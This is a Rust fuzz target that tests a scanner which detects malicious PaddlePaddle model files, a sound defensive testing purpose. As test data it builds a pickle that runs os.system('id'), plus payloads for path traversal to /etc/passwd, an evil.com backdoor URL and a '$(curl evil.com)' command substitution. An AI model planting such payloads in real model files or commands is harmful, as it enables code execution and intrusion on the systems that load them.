// fuzz_paddle.rs — Deep PaddlePaddle binary fuzzer
//
// Exercises PaddlePaddle model scanning with adversarial payloads:
// - Embedded dangerous pickles after paddle header
// - Protobuf varint overflow fields
// - Path traversal in tensor names
// - Cross-scanner (GGUF-like headers after paddle magic)
// - Truncation robustness
//
// Run: cargo +nightly fuzz run fuzz_paddle -- -max_len=65536

#![no_main]

use libfuzzer_sys::fuzz_target;
use fuzz_helpers::{builders, invariants};
use sentinel_pickle::{policy::ScanPolicy, scanner::scan_data};

fuzz_target!(|data: &[u8]| {
    if data.len() < 4 { return; }

    let policy = ScanPolicy::new(false);
    let strict = ScanPolicy::new(true);

    // ── Pass 1: Standard paddle binary ────────────────────────────────
    let paddle = builders::build_paddle_binary(data);
    let findings = scan_data(&paddle, &policy);
    invariants::assert_findings_valid(&findings);

    let strict_f = scan_data(&paddle, &strict);
    assert!(strict_f.len() >= findings.len());

    // ── Pass 2: Raw data (no magic) ───────────────────────────────────
    let _ = scan_data(data, &policy);

    // ── Pass 3: Embedded dangerous pickle ─────────────────────────────
    if data.len() > 8 {
        // os.system inside paddle container
        let mut evil_paddle = b"paddle\x00".to_vec();
        evil_paddle.extend_from_slice(&[0x80, 0x04]);
        evil_paddle.push(b'c');
        evil_paddle.extend_from_slice(b"os\nsystem\n");
        evil_paddle.push(0x8c); evil_paddle.push(2);
        evil_paddle.extend_from_slice(b"id");
        evil_paddle.push(0x85); evil_paddle.push(b'R');
        evil_paddle.push(b'.');
        let findings = scan_data(&evil_paddle, &policy);
        invariants::assert_findings_valid(&findings);
    }

    // ── Pass 4: Multiple embedded protocols ───────────────────────────
    for proto in [0u8, 2, 4, 5] {
        let mut embedded = b"paddle\x00".to_vec();
        if proto >= 2 {
            embedded.extend_from_slice(&[0x80, proto]);
        }
        embedded.extend_from_slice(&data[..data.len().min(256)]);
        embedded.push(b'.');
        let _ = scan_data(&embedded, &policy);
    }

    // ── Pass 5: Protobuf-like varint overflow ─────────────────────────
    {
        let mut pb_overflow = b"paddle\x00".to_vec();
        // Simulate a protobuf field with maximum varint
        pb_overflow.extend_from_slice(&[0xFF, 0xFF, 0xFF, 0xFF, 0x0F]);
        pb_overflow.extend_from_slice(data);
        let _ = scan_data(&pb_overflow, &policy);
    }

    // ── Pass 6: Injection payloads in tensor names ────────────────────
    {
        let payloads: &[&[u8]] = &[
            b"paddle\x00../../../etc/passwd",
            b"paddle\x00http://evil.com/backdoor",
            b"paddle\x00$(curl evil.com)",
            b"paddle\x00\x00\x00\x00\x00",
        ];
        for payload in payloads {
            let _ = scan_data(payload, &policy);
        }
    }

    // ── Pass 7: Truncation ────────────────────────────────────────────
    if paddle.len() > 4 {
        let cuts = [1, 4, 7, paddle.len() / 2, paddle.len() - 1];
        for &cut in &cuts {
            if cut > 0 && cut < paddle.len() {
                let _ = scan_data(&paddle[..cut], &policy);
            }
        }
    }

    // ── Pass 8: Idempotency ───────────────────────────────────────────
    let f1 = scan_data(&paddle, &policy);
    let f2 = scan_data(&paddle, &policy);
    assert_eq!(f1.len(), f2.len());
});
